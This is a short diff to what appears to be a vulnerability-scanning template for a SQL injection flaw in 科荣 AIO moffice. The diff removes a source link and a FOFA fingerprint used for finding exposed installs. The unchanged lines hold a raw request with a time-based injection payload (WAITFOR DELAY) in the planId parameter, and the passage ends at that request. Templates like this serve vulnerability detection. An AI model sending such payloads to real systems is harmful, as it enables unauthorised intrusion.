@@ -3,12 +3,8 @@ info:
   name: 科荣 AIO moffice SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/en7ikgq7ogmvgmz7'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: en7ikgq7ogmvgmz7
-    fofa: '"changeAccount(''8000'')"'
 http:
 - raw:
   - 'GET /moffice?op=showWorkPlan&planId=1'';WAITFOR+DELAY+''0:0:5''--&sid=1 HTTP/1.1
